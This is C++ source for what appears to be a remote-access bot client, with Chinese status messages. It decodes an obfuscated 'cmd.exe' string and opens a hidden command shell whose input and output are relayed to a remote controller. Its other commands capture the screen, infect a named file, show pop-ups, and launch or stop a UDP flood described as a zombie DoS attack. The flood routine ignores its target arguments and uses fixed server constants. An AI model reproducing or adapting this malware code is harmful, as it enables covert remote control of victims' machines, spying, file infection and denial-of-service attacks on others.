#include "XShellProcess.h"
#include "RemoteClientFrameWork.h"

static char EngChar[]={~'\\',~'c',~'m',~'d',~'.',~'e',~'x',~'e','\0'};


void ThreadMessageBox::run()
{
	MessageBox(NULL,m_MessageBox,"消息",MB_OK|MB_SETFOREGROUND);
}

void ThreadMessageBox::Show( const char *message )
{
	if(strlen(message)<sizeof(m_MessageBox)-1)
	strcpy(m_MessageBox,message);
	else
	{
		memcpy(m_MessageBox,message,sizeof(m_MessageBox)-1);
		m_MessageBox[sizeof(m_MessageBox)-1]='\0';
	}
	start();
}

ThreadMessageBox::ThreadMessageBox( const char * msg)
{
	Show(msg);
}


BOOL XShellProcess::ActivateCMD()
{
	SECURITY_ATTRIBUTES sa;
	sa.nLength=sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor=0;
	sa.bInheritHandle=TRUE;   
	if (m_bConsoleActivate)
	{
		DWORD dummy;
		if(m_hWritePipe2!=INVALID_HANDLE_VALUE)
		WriteFile(m_hWritePipe2,"exit\r\n",6,&dummy,0);   
		Close();
	}
	m_bConsoleActivate=false;
	

	
	if(!CreatePipe(&m_hReadPipe1,&m_hWritePipe1,&sa,0))
	{
		return FALSE;
	}
	if(!CreatePipe(&m_hReadPipe2,&m_hWritePipe2,&sa,0))
	{
		return FALSE;
	}

	STARTUPINFO si;
	ZeroMemory(&si,sizeof(si));
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = m_hReadPipe2;
	si.hStdOutput = si.hStdError = m_hWritePipe1;
	
	//printf(EngChar);

	char cmdLine[256] = {0};
	GetSystemDirectory(cmdLine,sizeof(cmdLine));
	
	char __EngChar[32];

	for (unsigned int i=0;i<strlen(EngChar);i++)
	{
		__EngChar[i]=~EngChar[i];
		__EngChar[i+1]='\0';
	}

	strcat_s(cmdLine,__EngChar);

	
	PROCESS_INFORMATION ProcessInformation;  

	//DEBUG_PROCESS for exit while this process was crashed.
	if(CreateProcess(cmdLine,NULL,NULL,NULL,TRUE,0,NULL,NULL,&si,&ProcessInformation) == 0)  
	{  
		return FALSE;  
	}

	m_bConsoleActivate=true;
	return TRUE;
}

void XShellProcess::run()
{
	//Receive buffer size must be large than 3
	assert(sizeof(m_RecvBuffer)>3);

	DWORD dwRere=0;

	while(TRUE)
	{
		if(m_hReadPipe1!=INVALID_HANDLE_VALUE&&m_bConsoleActivate)
		{
			PeekNamedPipe(m_hReadPipe1,m_RecvBuffer, sizeof(m_RecvBuffer),&m_lBytesRead,0,0);
			if(m_lBytesRead)
			{
			memset(m_RecvBuffer, 0, sizeof(m_RecvBuffer));  
			if(ReadFile(m_hReadPipe1,m_RecvBuffer,sizeof(m_RecvBuffer)-2,&m_lBytesRead,0))
			{
			if (m_RecvBuffer[sizeof(m_RecvBuffer)-3]&0x80)
			{
				if(!ReadFile(m_hReadPipe1,m_RecvBuffer+sizeof(m_RecvBuffer)-2,1,&dwRere,0))
					break;
			}
			XShellProcess_I In;
			In.Buffer=m_RecvBuffer;
			In.size=m_lBytesRead+dwRere;
			Recv(In);
			}
			}
			else
			{
			Sleep(300);
			}
		}
		else
		{
			Sleep(300);
		}
	}
}

bool  XShellProcess::ExecuteShellByCore(char *cmd)
{
	CubeGrammarSentence sen;
	char MSG[1024];
	m_Lexer.SortText(cmd);
	unsigned int SenType;
	SenType=m_Grammar.GetNextInstr(sen);
	if (SenType==GRAMMAR_SENTENCE_UNKNOW||SenType==GRAMMAR_SENTENCE_END)
	{
		return false;
	}

	if(SenType==m_Shell_Msg)
	{
		m_MessageBox.Show(sen.GetBlockString(1));
		G_RemoteFrameWork.OnShellRespones("弹窗已显示");
		return true;
	}

	if (SenType==m_Shell_activateCMD)
	{
		ActivateCMD();
		return true;
	}

	if (SenType==m_Shell_screenShot)
	{
		ScreenCapture(sen.GetBlockString(1));
		G_RemoteFrameWork.OnShellRespones("已截屏");
		return true;
	}
	
	if (SenType==m_Shell_Infect)
	{
		XInfester_InfectFile(sen.GetBlockString(1));
		G_RemoteFrameWork.OnShellRespones("目标文件已感染");
		return true;
	}

	if (SenType==m_Shell_Dos)
	{
		m_Ddos.Attack(sen.GetBlockString(1),atoi(sen.GetBlockString(2)),atoi(sen.GetBlockString(3)),atoi(sen.GetBlockString(4)));
		sprintf(MSG,"傀儡Dos攻击已经开始:Target %s Port: %s Time:%s ms Power: %s",
			sen.GetBlockString(1),sen.GetBlockString(2),sen.GetBlockString(3),sen.GetBlockString(4));
		G_RemoteFrameWork.OnShellRespones(MSG);
		return true;
	}

	if (SenType==m_Shell_DosStop)
	{
		m_Ddos.stop();
		G_RemoteFrameWork.OnShellRespones("傀儡Dos攻击已经停止");
	}
	return false;
}


size_t XShellProcess::Send( XShellProcess_O &Out )
{
	if(ExecuteShellByCore(Out.Buffer))
	{
		return 0;
	}

	if(m_bConsoleActivate)
 	{
		WriteFile(m_hWritePipe2, "\r\n",2,&m_lBytesWrite,0);  
 		Sleep(100);  

		if(!WriteFile(m_hWritePipe2, Out.Buffer,Out.size,&m_lBytesWrite,0))                       
		{    
		return 0;  
		}  
		return m_lBytesWrite;
	}
	else
	{
		G_RemoteFrameWork.OnShellRespones("ERROR: Unknow Shell");
	}
	return 0;
}

void XShellProcess::Recv( XShellProcess_I &in )
{
	G_RemoteFrameWork.OnShellRespones(in.Buffer);
}

void XShellProcess::Close()
{
	if(m_hReadPipe1!=INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hReadPipe1);
		m_hReadPipe1=INVALID_HANDLE_VALUE;
	}
	if(m_hReadPipe2!=INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hReadPipe2);
		m_hReadPipe2=INVALID_HANDLE_VALUE;
	}
	if(m_hWritePipe1!=INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hWritePipe1);
		m_hWritePipe1=INVALID_HANDLE_VALUE;
	}
	if(m_hWritePipe2!=INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hWritePipe2);
		m_hWritePipe2=INVALID_HANDLE_VALUE;
	}
}




BOOL XShellProcess::Initialize(XShellProcess_IO &info)
{
	m_hReadPipe1=INVALID_HANDLE_VALUE;
	m_hReadPipe2=INVALID_HANDLE_VALUE;
	m_hWritePipe1=INVALID_HANDLE_VALUE;
	m_hWritePipe2=INVALID_HANDLE_VALUE;

	m_bConsoleActivate=false;
	m_Ddos.initialize();
	//Grammar initialize

	m_Lexer.RegisterSpacer(' ');
	m_Lexer.RegisterSpacer('\r');
	m_Lexer.RegisterSpacer('\n');

	m_Grammar.SetLexer(&m_Lexer);

	CubeBlockType Param=CubeBlockType(NULL,1,GRAMMAR_TYPE_ANY);
	CubeBlockType Spacer=CubeBlockType(NULL,1,GRAMMAR_SPACER);
	CubeBlockType Number=CubeBlockType("[0-9]+",2,GRAMMAR_TOKEN,GRAMMAR_TOKEN_NUMBER);
	Number.AsRegex();

	m_Grammar.RegisterBlockType(Number);
	m_Grammar.RegisterBlockType(Param);
	m_Grammar.RegisterDiscard(Spacer);
	
	CubeBlockType btShellMsg=CubeBlockType(REMOTESHELL_SCMD_MSG,2,GRAMMAR_TOKEN,GRAMMAR_TOKEN_SCMD_MSG);
	m_Grammar.RegisterBlockType(btShellMsg);

	CubeGrammarSentence Sen;
	Sen.Reset();
	Sen.add(btShellMsg);
	Sen.add(Param);
	m_Shell_Msg=m_Grammar.RegisterSentence(Sen);


	CubeBlockType btShellCmd=CubeBlockType(REMOTESHELL_SCMD_ACTCMD,2,GRAMMAR_TOKEN,GRAMMAR_TOKEN_SCMD_ACTCMD);
	m_Grammar.RegisterBlockType(btShellCmd);

	Sen.Reset();
	Sen.add(btShellCmd);
	m_Shell_activateCMD=m_Grammar.RegisterSentence(Sen);

	CubeBlockType btShellScreenShot=CubeBlockType(REMOTESHELL_SCMD_SCREENSHOT,2,GRAMMAR_TOKEN,GRAMMAR_TOKEN_SCMD_SCREENSHOT);
	m_Grammar.RegisterBlockType(btShellScreenShot);

	Sen.Reset();
	Sen.add(btShellScreenShot);
	Sen.add(Param);
	m_Shell_screenShot=m_Grammar.RegisterSentence(Sen);

	CubeBlockType btShellInfect=CubeBlockType(REMOTESHELL_SCMD_INFECT,2,GRAMMAR_TOKEN,GRAMMAR_TOKEN_SCMD_INFECT);
	m_Grammar.RegisterBlockType(btShellInfect);

	Sen.Reset();
	Sen.add(btShellInfect);
	Sen.add(Param);
	m_Shell_Infect=m_Grammar.RegisterSentence(Sen);


	CubeBlockType btShellDosAttack=CubeBlockType(REMOTESHELL_SCMD_DOSATK,2,GRAMMAR_TOKEN,GRAMMAR_TOKEN_SCMD_DOSATK);
	m_Grammar.RegisterBlockType(btShellDosAttack);

	Sen.Reset();
	Sen.add(btShellDosAttack);
	Sen.add(Param);  //Target IP
	Sen.add(Number); //Target Port
	Sen.add(Number); //Timems;
	Sen.add(Number); //power;
	m_Shell_Dos=m_Grammar.RegisterSentence(Sen);

	CubeBlockType btShellDosAttackStop=CubeBlockType(REMOTESHELL_SCMD_DOSATKSTOP,2,GRAMMAR_TOKEN,GRAMMAR_TOKEN_SCMD_DOSATKSTOP);
	m_Grammar.RegisterBlockType(btShellDosAttackStop);

	Sen.Reset();
	Sen.add(btShellDosAttackStop);
	m_Shell_DosStop=m_Grammar.RegisterSentence(Sen);

	return TRUE;
}






void ScreenCapture(LPSTR filename, WORD BitCount, LPRECT lpRect){
	HBITMAP hBitmap;
	HDC hScreenDC = GetWindowDC(NULL);//CreateDC("DISPLAY", NULL, NULL, NULL);
	HDC hmemDC = CreateCompatibleDC(hScreenDC);


	int ScreenWidth = GetSystemMetrics(SM_CXSCREEN);//GetDeviceCaps(hScreenDC, HORZRES);
	int ScreenHeight = GetSystemMetrics(SM_CYSCREEN);//GetDeviceCaps(hScreenDC, VERTRES);


	HBITMAP hOldBM;
	PVOID lpvpxldata;
	INT ixStart;
	INT iyStart;
	INT ix;
	INT iy;
	DWORD dwBitmapArraySize;
	DWORD nBitsOffset;
	DWORD lImageSize;
	DWORD lFileSize;
	BITMAPINFO bmInfo;
	BITMAPFILEHEADER bmFileHeader;

	if (lpRect == NULL)
	{
		ixStart = iyStart =0;
		ix = ScreenWidth;
		iy = ScreenHeight;
	}else{
		ixStart = lpRect->left;
		iyStart = lpRect->top;
		ix = lpRect->right - lpRect->left;
		iy = lpRect->bottom - lpRect->top;
	}

	hBitmap = CreateCompatibleBitmap(hScreenDC, ix, iy);

	hOldBM = (HBITMAP)SelectObject(hmemDC, hBitmap);

	BitBlt(hmemDC, 0, 0, ix, iy, hScreenDC, ixStart, iyStart, SRCCOPY);

	hBitmap = (HBITMAP)SelectObject(hmemDC, hOldBM);


	if (filename == NULL)
	{
		DeleteDC(hScreenDC);
		DeleteDC(hmemDC);
		return ;
	}

	dwBitmapArraySize = ((ix*32/8+3)/4*4)*iy; //((((ix*32) + 31) & ~31) >> 3) *iy;
	lpvpxldata = HeapAlloc(GetProcessHeap(), HEAP_NO_SERIALIZE, dwBitmapArraySize);
	ZeroMemory(lpvpxldata, dwBitmapArraySize);


	ZeroMemory(&bmInfo, sizeof(BITMAPINFO));
	bmInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmInfo.bmiHeader.biWidth = ix;
	bmInfo.bmiHeader.biHeight = iy;
	bmInfo.bmiHeader.biPlanes = 1;
	bmInfo.bmiHeader.biBitCount = BitCount;
	bmInfo.bmiHeader.biCompression = BI_RGB;


	ZeroMemory(&bmFileHeader, sizeof(BITMAPFILEHEADER));
	nBitsOffset = sizeof(BITMAPFILEHEADER) + bmInfo.bmiHeader.biSize;
	lImageSize = (((bmInfo.bmiHeader.biWidth * bmInfo.bmiHeader.biBitCount)/8+3)/4*4)*bmInfo.bmiHeader.biHeight; //((((bmInfo.bmiHeader.biWidth * bmInfo.bmiHeader.biBitCount) + 31) & ~31) >> 3)*bmInfo.bmiHeader.biHeight;
	lFileSize = nBitsOffset + lImageSize;
	bmFileHeader.bfType = 'B' +('M'<<8);
	bmFileHeader.bfSize = lFileSize;
	bmFileHeader.bfOffBits = nBitsOffset;


	GetDIBits(hmemDC, hBitmap, 0, bmInfo.bmiHeader.biHeight, lpvpxldata, &bmInfo, DIB_RGB_COLORS);
	//GetBitmapBits(hBitmap,dwBitmapArraySize,lpvpxldata);

	FILE *pf=fopen(filename,"wb");

	if (pf != NULL)
	{
		fwrite(&bmFileHeader, sizeof(BITMAPFILEHEADER),1,pf);
		fwrite(&bmInfo,		  sizeof(BITMAPINFO),1,pf);
		fwrite(lpvpxldata,	  lImageSize,1,pf);
		fclose(pf);
	}
	

	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, lpvpxldata);
	ReleaseDC(0, hScreenDC);
	DeleteDC(hmemDC);
	return ;
}

BOOL XShell_Ddos::initialize()
{
	Cube_SocketUDP_IO __IO;
	m_Power=10;
	m_IsOK=FALSE;
	for(int i=0;i<32;i++)
	{
		__IO.Port=XSHELL_DDOS_UDP_PORT+i;
		if(m_UDP.Initialize(__IO))
			{
				m_IsOK=TRUE;
				return TRUE;
		}
	}
	return FALSE;

}

void XShell_Ddos::run()
{
	if (!m_IsOK)
	{
		return;
	}

	static char DummyBuffer[2048];
	Cube_SocketUDP_O __O;
	__O.Buffer=DummyBuffer;
	__O.Size=sizeof(DummyBuffer);
	__O.to=m_TargetAddr;

	while (m_TimeMs)
	{
		m_UDP.Send(__O);
		Sleep(1000-m_Power);
		if (m_TimeMs>(1000-m_Power))
		{
			m_TimeMs-=(1000-m_Power);
		}
		else
		{
			m_TimeMs=0;
		}
	}

}

void XShell_Ddos::Attack(char *IP,unsigned int port,unsigned long Timems,unsigned int Power)
{
	m_TargetAddr.sin_family=AF_INET;

	if (INADDR_NONE == inet_addr(REMOTESHELL_SERVER_IPADDR))
		return ;

	m_TargetAddr.sin_port=htons(REMOTESHELL_SERVER_PORT);
	m_TargetAddr.sin_addr.s_addr=inet_addr(REMOTESHELL_SERVER_IPADDR);

	m_TimeMs=Timems;

	if (Power>1000)
	{
		m_Power=1000;
	}
	else
	{
		m_Power=Power;
	}

	start();
}

void XShell_Ddos::AttackStop()
{
	terminate();
	m_TimeMs=0;
	m_IsOK=FALSE;
}
